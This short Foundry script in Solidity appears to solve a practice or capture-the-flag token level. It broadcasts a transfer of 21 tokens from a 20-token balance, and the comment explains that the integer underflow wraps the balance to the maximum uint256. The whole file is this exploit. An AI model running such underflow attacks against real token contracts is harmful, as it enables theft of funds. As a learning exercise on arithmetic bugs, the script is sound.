// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Token.sol";
import "@forge-std/Script.sol";

contract TokenScript is Script {

    Token public tokenContract;

    function setUp() public {
        tokenContract = Token(payable(vm.envAddress("TOKEN_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // just send tokens to another address
        tokenContract.transfer(0xC127C0eD0fbc2AA34dD9AA01A0cB01034B9099e6, 21); // for underflow 20 -21 = -1 which takes us to max value of uint256 and increase the balance
        vm.stopBroadcast();
    }

}